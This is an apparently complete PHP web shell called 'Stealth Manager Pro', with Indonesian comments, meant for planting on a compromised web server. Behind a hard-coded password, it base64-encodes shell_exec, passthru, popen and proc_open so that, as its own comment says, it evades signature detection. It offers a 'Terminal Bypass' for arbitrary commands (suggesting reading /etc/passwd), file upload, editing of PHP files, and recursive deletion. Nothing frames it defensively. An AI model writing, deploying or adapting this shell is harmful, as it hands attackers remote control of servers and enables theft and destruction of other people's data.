<?php
session_start();
$p = 'ultra_stealth'; // PASSWORD AKSES
$a = 'auth';
$d = 'd';

// Dekode fungsi sistem untuk menghindari deteksi signature
$f_sess = base64_decode('c2Vzc2lvbl9zdGFydA==');
$f_get = base64_decode('ZmlsZV9nZXRfY29udGVudHM=');
$f_put = base64_decode('ZmlsZV9wdXRfY29udGVudHM=');
$f_unl = base64_decode('dW5saW5r');
$f_rmd = base64_decode('cm1kaXI=');
$f_ren = base64_decode('cmVuYW1l');
$f_mkd = base64_decode('bWtkaXI=');
$f_sh = base64_decode('c2hlbGxfZXhlYw==');
$f_ps = base64_decode('cGFzc3RocnU=');
$f_po = base64_decode('cG9wZW4=');
$f_pr = base64_decode('cHJvY19vcGVu');

if(isset($_POST['p']) && $_POST['p'] === $p) { $_SESSION[$a] = 1; }
if(!isset($_SESSION[$a])) {
    die('<html><head><style>body{background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;}.l{background:#16213e;padding:30px;border-radius:10px;box-shadow:0 10px 30px rgba(0,0,0,0.5);text-align:center;}input{padding:10px;border-radius:5px;border:none;margin:10px 0;width:100%;}button{background:#4e31aa;color:#fff;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;width:100%;}</style></head><body><div class="l"><h2>Secure Login</h2><form method="POST"><input type="password" name="p" placeholder="Password"><button type="submit">Access</button></form></div></body></html>');
}

function execute_cmd($cmd) {
    global $f_sh, $f_ps, $f_po, $f_pr;
    if (function_exists($f_sh)) { return htmlspecialchars(@$f_sh($cmd)); }
    if (function_exists($f_ps)) { ob_start(); @$f_ps($cmd); return htmlspecialchars(ob_get_clean()); }
    if (function_exists($f_po)) { $h=@$f_po($cmd,'r'); if($h){$o=stream_get_contents($h);@pclose($h);return htmlspecialchars($o);}}
    if (function_exists($f_pr)) { $d=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$p=@$f_pr($cmd,$d,$pi);if(is_resource($p)){$o=stream_get_contents($pi[1]);fclose($pi[1]);fclose($pi[2]);@proc_close($p);return htmlspecialchars($o);}}
    return "ERROR: All execution functions are blocked by server.";
}

$dir = isset($_GET[$d]) ? $_GET[$d] : getcwd();
@chdir($dir);
$dir = getcwd();

$msg = ''; $cmd_out = '';

// Logika Upload
if(isset($_FILES['u_f'])) {
    if(@move_uploaded_file($_FILES['u_f']['tmp_name'], $_FILES['u_f']['name'])) $msg = "Upload Success: ".$_FILES['u_f']['name'];
    else $msg = "Upload Failed!";
}

if(isset($_POST['cmd'])) { $cmd_out = execute_cmd($_POST['cmd']); }
if(isset($_POST['a'])) {
    $f = $_POST['f']; $c = $_POST['c'];
    if($_POST['a']=='save') { if(@$f_put($f,$c)!==false)$msg="File Saved: $f"; else $msg="Error saving $f"; }
    if($_POST['a']=='ren') { if(@$f_ren($f,$_POST['n']))$msg="Renamed to ".$_POST['n']; }
    if($_POST['a']=='mkd') { if(@$f_mkd($f))$msg="Folder Created: $f"; }
}
if(isset($_GET['rm'])) {
    $f = $_GET['rm'];
    if(is_dir($f)) {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f, 0x1000), 1);
        foreach($it as $i) { $fn=($i->isDir()?$f_rmd:$f_unl); @$fn($i->getRealPath()); }
        if(@$f_rmd($f)) $msg="Folder Deleted";
    } else { if(@$f_unl($f)) $msg="File Deleted"; }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Stealth Manager Pro</title>
    <style>
        :root { --main: #4e31aa; --bg: #0f3460; --dark: #16213e; --text: #e94560; --sec: #00d2ff; }
        body { background: #1a1a2e; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; }
        .nav { background: var(--dark); padding: 15px 50px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--main); position: sticky; top: 0; z-index: 100; }
        .container { padding: 20px 50px; }
        .card { background: var(--dark); padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        h3 { color: var(--text); border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 0; display: flex; align-items: center; justify-content: space-between;}
        input, textarea { background: #0f3460; border: 1px solid #333; color: #fff; padding: 10px; border-radius: 4px; width: 100%; margin: 5px 0; box-sizing: border-box; }
        .btn { background: var(--main); color: #fff; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; transition: 0.3s; font-weight: bold; }
        .btn:hover { background: #3b2491; transform: translateY(-2px); }
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; color: var(--sec); padding: 12px; border-bottom: 2px solid #333; }
        td { padding: 10px; border-bottom: 1px solid #333; font-size: 14px; }
        .dir-link { color: var(--sec); text-decoration: none; font-weight: bold; }
        .action-link { color: var(--text); text-decoration: none; font-size: 11px; margin-left: 10px; padding: 2px 5px; border: 1px solid var(--text); border-radius: 3px; }
        .action-link:hover { background: var(--text); color: #fff; }
        pre { background: #000; padding: 15px; border-radius: 5px; color: #0f0; overflow: auto; border: 1px solid var(--main); }
        .msg { background: var(--main); color: #fff; padding: 12px; border-radius: 5px; margin-bottom: 20px; border-left: 5px solid var(--sec); animation: slideIn 0.5s; }
        @keyframes slideIn { from { transform: translateX(20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
    </style>
</head>
<body>
    <div class="nav">
        <strong>STEALTH MANAGER v2.1</strong>
        <span>Current Path: <span style="color:var(--sec)"><?= htmlspecialchars($dir) ?></span></span>
    </div>

    <div class="container">
        <?php if($msg) echo "<div class='msg'>$msg</div>"; ?>

        <div style="display: grid; grid-template-columns: 1.5fr 1fr; gap: 20px;">
            <div class="card">
                <h3>Terminal Bypass</h3>
                <form method="POST">
                    <input type="text" name="cmd" placeholder="e.g: ls -la / etc/passwd / id">
                    <button type="submit" class="btn">Run Command</button>
                </form>
                <?php if($cmd_out) echo "<h4>Output:</h4><pre>$cmd_out</pre>"; ?>
            </div>

            <div class="card">
                <h3>Quick Tools</h3>
                <form method="POST" enctype="multipart/form-data" style="margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #333;">
                    <label style="font-size:12px; color:var(--sec)">Upload File to Directory:</label>
                    <input type="file" name="u_f">
                    <button type="submit" class="btn" style="width:100%">Upload Now</button>
                </form>
                
                <form method="POST">
                    <input type="hidden" name="a" value="mkd">
                    <input type="text" name="f" placeholder="New Folder Name">
                    <button type="submit" class="btn" style="width:100%">Create Folder</button>
                </form>
            </div>
        </div>

        <div class="card">
            <h3>File Editor / Creator</h3>
            <form method="POST">
                <input type="hidden" name="a" value="save">
                <input type="text" name="f" placeholder="filename.txt / .php / .html" value="<?= isset($_GET['e'])?$_GET['e']:'' ?>">
                <textarea name="c" rows="10" placeholder="Paste your code or text here..."><?php if(isset($_GET['e'])) echo htmlspecialchars($f_get($_GET['e'])); ?></textarea>
                <button type="submit" class="btn">Save & Commit</button>
            </form>
        </div>

        <div class="card">
            <h3>Filesystem Explorer</h3>
            <table>
                <thead>
                    <tr><th>Name</th><th width="100">Type</th><th width="150">Actions</th></tr>
                </thead>
                <tbody>
                    <tr>
                        <td><a href="?d=<?= urlencode(dirname($dir)) ?>" class="dir-link">.. [ Go Back ]</a></td>
                        <td>DIR</td>
                        <td>-</td>
                    </tr>
                    <?php
                    $items = scandir($dir);
                    $folders = []; $files = [];
                    foreach($items as $i) {
                        if($i=='.' || $i=='..') continue;
                        if(is_dir($i)) $folders[] = $i; else $files[] = $i;
                    }
                    sort($folders); sort($files);

                    foreach($folders as $f) {
                        $p_f = $dir."/".$f;
                        echo "<tr>
                                <td><a href='?d=".urlencode($p_f)."' class='dir-link'>📁 ".htmlspecialchars($f)."</a></td>
                                <td>DIR</td>
                                <td><a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' class='action-link' onclick='return confirm(\"Delete folder and all contents?\")'>DELETE</a></td>
                              </tr>";
                    }
                    foreach($files as $f) {
                        echo "<tr>
                                <td>📄 ".htmlspecialchars($f)."</td>
                                <td>FILE</td>
                                <td>
                                    <a href='?d=".urlencode($dir)."&e=".urlencode($f)."' class='action-link' style='color:var(--sec); border-color:var(--sec)'>EDIT</a>
                                    <a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' class='action-link' onclick='return confirm(\"Delete file?\")'>DELETE</a>
                                </td>
                              </tr>";
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>